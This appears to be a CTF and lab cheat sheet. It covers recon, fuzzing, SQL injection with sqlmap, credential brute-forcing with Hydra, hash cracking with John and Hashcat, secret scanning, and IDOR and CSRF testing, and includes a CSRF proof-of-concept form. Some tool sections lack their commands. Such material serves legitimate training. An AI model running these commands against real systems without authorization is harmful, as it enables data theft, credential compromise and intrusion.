Tool Helper

Detailed Tool Guide

This page is organized by tools. Every tool section includes purpose, method-based workflow, important flags, and command examples so you can practice step-by-step in labs and CTF events.

Legal reminder: run these commands only in authorized CTF labs, your own machines, or systems with written permission.

Nmap is your first tool for host discovery, port mapping, service detection, OS hints, and script-based checks.

When To Use

  • At the start of every box/challenge
  • After gaining access to map internal services
  • Before exploitation to identify exact versions

Method 1: Host Discovery

Discovery

nmap -sn 10.10.10.0/24
nmap -sn -PR 10.10.10.0/24
nmap -Pn 10.10.10.5

Method 2: Port Mapping

TCP/UDP

nmap -p- --min-rate 5000 -T4 -oA full_tcp 10.10.10.5
nmap -sC -sV -p 22,80,443 -oA svc_scan 10.10.10.5
nmap -sU --top-ports 100 --open -oA udp_top 10.10.10.5

Method 3: NSE Scripts

Script Scan

nmap --script vuln -p 445 10.10.10.5
nmap --script "http-*" -p 80,443 10.10.10.5
nmap --script smb-enum-shares,smb-enum-users -p 445 10.10.10.5

Save output with -oA and reuse in later tools to avoid repeating recon.

Gobuster is fast for directory brute-forcing, vhost discovery, and DNS subdomain enumeration.

Important Modes

  • dir for web paths
  • vhost for virtual host brute force
  • dns for subdomains

Method 1: Directory Enumeration

Dir Mode

gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://target -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html
gobuster dir -u http://target -w wordlist.txt -s 200,204,301,302,307,401,403

Method 2: VHost Enumeration

VHost Mode

gobuster vhost -u http://target -w subdomains.txt --append-domain
gobuster vhost -u http://target -w subdomains.txt -t 50 -k
gobuster vhost -u https://target -w subdomains.txt -s 200,301,302,403

Method 3: DNS Enumeration

DNS Mode

gobuster dns -d target.com -w subdomains.txt
gobuster dns -d target.com -w subdomains.txt -i
gobuster dns -d target.com -w subdomains.txt -r 8.8.8.8

Use curated wordlists per target type (API, admin panel, CMS) instead of one generic list.

FFUF is flexible fuzzing for files, parameters, headers, JSON fields, vhosts, and recursive discovery.

Method 1: Path Fuzzing

Directory Fuzz

ffuf -u http://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
ffuf -u http://target/FUZZ -w raft-medium-directories.txt -fc 404
ffuf -u http://target/FUZZ -w wordlist.txt -mc 200,204,301,302,403

Method 2: Parameter Discovery

GET/POST

ffuf -u "http://target/page.php?FUZZ=test" -w params.txt -fs 0
ffuf -X POST -u http://target/login -d "FUZZ=test" -w params.txt -H "Content-Type: application/x-www-form-urlencoded"
ffuf -u http://target/api/FUZZ -w endpoints.txt -H "Authorization: Bearer TOKEN"

Method 3: Filter and Calibrate

Filtering

ffuf -u http://target/FUZZ -w wordlist.txt -fs 1234
ffuf -u http://target/FUZZ -w wordlist.txt -fw 42
ffuf -u http://target/FUZZ -w wordlist.txt -ac -v

Method 4: Recursive Scan

Recursion

ffuf -u http://target/FUZZ -w wordlist.txt -recursion -recursion-depth 2
ffuf -u http://target/FUZZ -w wordlist.txt -recursion -e .php,.txt,.bak
ffuf -u https://target/FUZZ -w wordlist.txt -rate 100

Method 1: Standard Scan

Baseline

nikto -h http://target

Method 2: Scan Tuning

Focused Checks

Method 3: Output and Reporting

Output

How To Use Results

  • Prioritize exposed backups and admin files
  • Cross-check with Nmap/FFUF results

SQLMap automates SQL injection testing after you confirm the parameter is potentially injectable.

Method 1: Basic Detection

GET Param

sqlmap -u "http://target/item.php?id=1" --batch
sqlmap -u "http://target/item.php?id=1" --dbs --batch
sqlmap -u "http://target/item.php?id=1" --level 3 --risk 2 --batch

Method 2: POST and Authenticated Requests

POST/Cookie

sqlmap -u "http://target/login" --data="username=test&password=test" --batch
sqlmap -u "http://target/profile" --cookie="PHPSESSID=abcd1234" --dbs --batch
sqlmap -r request.txt --batch

Method 3: Database Enumeration

Enum

sqlmap -u "http://target/item.php?id=1" -D appdb --tables --batch
sqlmap -u "http://target/item.php?id=1" -D appdb -T users --columns --batch
sqlmap -u "http://target/item.php?id=1" -D appdb -T users --dump --batch

Method 4: Advanced Options

Advanced

sqlmap -u "http://target/item.php?id=1" --random-agent --threads 5 --batch
sqlmap -u "http://target/item.php?id=1" --tamper=space2comment --batch
sqlmap -u "http://target/item.php?id=1" --current-user --is-dba --batch

Always verify impact carefully and avoid noisy settings when challenge environment is unstable.

Burp is the core manual testing platform for intercepting, modifying, replaying, and automating HTTP requests.

Method 1: Intercept + Proxy History

  • Set browser proxy to Burp listener
  • Turn intercept on only when needed
  • Use HTTP History to map every endpoint

Goal: build attack surface map before exploitation.

Method 2: Repeater Workflow

  • Send candidate requests to Repeater
  • Test one variable at a time
  • Compare status, length, and response body
  • Use tabs for baseline vs manipulated requests

Method 3: Intruder and Payload Strategy

  • Sniper for single-position testing
  • Pitchfork for paired payload lists
  • Cluster bomb for multi-dimension brute force
  • Filter by response code, length, and grep-match

Method 4: Decoder / Comparer / Extensions

  • Decode JWT/Base64/URL data quickly
  • Use Comparer for auth bypass diffing
  • Add BApps for specific challenge classes
  • Use Logger++ for full request tracing

Burp gives best results when you keep clean notes: endpoint, request, expected behavior, observed flaw.

Hydra performs online credential attacks for many protocols in CTF labs where brute force is allowed.

Method 1: SSH / FTP / RDP

Protocol Login

hydra -L users.txt -P passwords.txt ssh://10.10.10.5
hydra -l admin -P rockyou.txt ftp://10.10.10.5
hydra -L users.txt -P passwords.txt rdp://10.10.10.5

Method 2: HTTP Form Attack

HTTP POST Form

hydra -l admin -P rockyou.txt target http-post-form \
"/login:username=^USER^&password=^PASS^:Invalid credentials"
hydra -L users.txt -P passwords.txt target http-get /protected

Method 3: Performance Control

Speed / Resume

hydra -L users.txt -P passwords.txt ssh://10.10.10.5 -t 4 -W 3
hydra -R
hydra -l admin -P smalllist.txt ssh://10.10.10.5 -f

Best Practice

  • Start with small candidate lists first
  • Tune threads to avoid service lockouts
  • Stop early when valid creds are found
  • Document exact failure string for web forms

John is efficient for offline password hash cracking and supports many file-to-hash converters.

Method 1: Format Detection + Wordlist

Base Flow

john --list=formats | head
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt

Method 2: System Hashes

Linux Credentials

unshadow passwd.txt shadow.txt > combo.txt
john --wordlist=rockyou.txt combo.txt
john --show combo.txt

Method 3: Archive / Document Hashes

Converters

zip2john secret.zip > zip.hash
rar2john secret.rar > rar.hash
john --wordlist=rockyou.txt zip.hash

Method 4: Incremental + Rules

Advanced Crack

john --incremental hashes.txt
john --wordlist=rockyou.txt --rules hashes.txt
john --session=ctf-john --restore

Hashcat provides high-speed GPU cracking with wordlist, mask, combinator, and rule-based attacks.

Method 1: Identify + Dictionary

Wordlist Attack

hashid hashes.txt
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt --username

Method 2: Mask Attack

Bruteforce Pattern

hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?d?d
hashcat -m 1000 -a 3 ntlm.txt ?u?l?l?l?l?d?d?d
hashcat -m 1800 -a 3 sha512crypt.txt ?a?a?a?a?a?a

Method 3: Rules and Hybrid

Rule + Hybrid

hashcat -m 0 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 0 -a 6 hashes.txt words.txt ?d?d
hashcat -m 0 -a 7 hashes.txt ?d?d words.txt

Method 4: Sessions and Results

Control

hashcat --session ctf1 -m 0 -a 0 hashes.txt rockyou.txt
hashcat --restore --session ctf1
hashcat -m 0 hashes.txt --show

Method 1: Basic Crawl

Baseline

katana -u https://target.tld
katana -u https://target.tld -d 2

Method 2: Scoped and Silent Output

Scope

Parameters

With httpx

subfinder -d target.tld -silent | httpx -silent | katana -list - -silent
katana -u https://target.tld -silent | grep "api" | sort -u
katana -u https://target.tld -silent | tee katana-endpoints.txt

SecretFinder scans JavaScript sources for API keys, tokens, access secrets, and hardcoded credentials in client-side assets.

Method 1: Setup

Install

git clone https://github.com/m4ll0k/SecretFinder.git
cd SecretFinder
pip3 install -r requirements.txt

Method 2: Single JS Scan

Single File

python3 SecretFinder.py -i https://target.tld/static/app.js -o cli
python3 SecretFinder.py -i https://target.tld/main.js -o html
python3 SecretFinder.py -i local.js -o cli

Method 3: Batch Scan from Katana

Batch

cat katana-endpoints.txt | grep -E "\.js($|\?)" | sort -u > js_files.txt
for u in $(cat js_files.txt); do python3 SecretFinder.py -i "$u" -o cli; done
for u in $(cat js_files.txt); do python3 SecretFinder.py -i "$u" -o html > "$(basename $u).html"; done

Method 4: Validation

  • Test whether discovered keys are active
  • Confirm scope and permission boundaries
  • Mask sensitive values in reports/screenshots
  • Report impact with minimal exposure

IDOR exploitation is access-control testing, not guessing only. Test horizontal, vertical, and indirect object references.

Step 1: Baseline Requests

  • Capture authenticated request for own object
  • Identify object key (`id`, UUID, file path)
  • Check if key is predictable/sequential
  • Save clean baseline response

Step 2: Horizontal Access Test

Object Swap

GET /api/order/101
GET /api/order/102
GET /api/order/103
# Compare status/body for cross-user data leak

Step 3: Token/Role Switch

Session Compare

curl -H "Authorization: Bearer USER_A" https://target/api/user/200
curl -H "Authorization: Bearer USER_B" https://target/api/user/200
curl -H "Authorization: Bearer LOW_ROLE" https://target/api/admin/report

Step 4: Batch Verification

Quick Sweep

for i in $(seq 100 130); do curl -s https://target/api/invoice/$i; done
for i in $(seq 1 50); do curl -s -H "Authorization: Bearer TOKEN" https://target/api/profile/$i; done

CSRF testing checks if victim browser can trigger state-changing actions without explicit user intent or anti-CSRF controls.

Step 1: Identify CSRF Candidate Endpoints

  • Password/email change
  • Transfer/payment actions
  • Security settings updates
  • Role/permission changes

Step 2: Token Analysis

Session/Token Checks

curl -I https://target | findstr /I "set-cookie"
# verify SameSite, Secure, HttpOnly
# in Burp: remove csrf token and replay request

Step 3: Cross-Site Request Simulation

PoC Template (Lab)

<form action="https://target/account/email" method="POST">
  <input name="email" value="attacker@lab.tld">
  <input type="submit">
</form>

Step 4: Root Cause + Fix

  • Add per-request unpredictable CSRF tokens
  • Validate Origin/Referer for sensitive actions
  • Enforce SameSite cookies correctly
  • Require re-auth for high-risk operations
